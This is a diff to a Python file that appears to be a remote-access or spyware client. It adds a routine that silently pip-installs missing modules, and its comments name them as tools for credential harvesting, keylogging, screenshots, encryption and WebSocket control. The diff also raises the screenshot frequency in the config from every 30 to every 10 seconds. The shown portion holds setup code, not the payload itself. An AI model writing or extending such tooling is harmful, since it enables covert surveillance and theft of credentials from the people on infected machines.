@@ -1,4 +1,49 @@
-﻿import urllib3
+﻿import sys
+import subprocess
+import importlib
+
+# List of required modules (standard libs are ignored; pip won't install them)
+REQUIRED_MODULES = [
+    'pyautogui',      # Screenshots/GUI control
+    'psutil',         # System info/processes
+    'requests',       # HTTP requests
+    'pywin32',        # win32crypt (for credential harvesting)
+    'pynput',         # Keylogger
+    'Crypto',         # PyCryptodome (AES encryption)
+    'socketio',       # WebSocket client (if used)
+    'urllib3',        # Disabling SSL warnings
+]
+
+def check_dependencies():
+    missing_modules = []
+    for module in REQUIRED_MODULES:
+        try:
+            importlib.import_module(module)
+        except ImportError:
+            missing_modules.append(module)
+    
+    if missing_modules:
+        print(f"[!] Missing modules: {', '.join(missing_modules)}")
+        print("[*] Attempting to install them...")
+        
+        for module in missing_modules:
+            try:
+                # Handle pywin32 separately (its pip name differs)
+                if module == 'pywin32':
+                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
+                else:
+                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])
+                print(f"  [+] Installed: {module}")
+            except subprocess.CalledProcessError:
+                print(f"  [!] Failed to install: {module}")
+                sys.exit(1)
+
+# Run the check
+check_dependencies()
+
+
+
+import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import os
 import sys
@@ -43,7 +88,7 @@ class Config:
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = True
-        self.SCREENSHOT_FREQUENCY = 30
+        self.SCREENSHOT_FREQUENCY = 10
 
 # ======================
 # Encryption
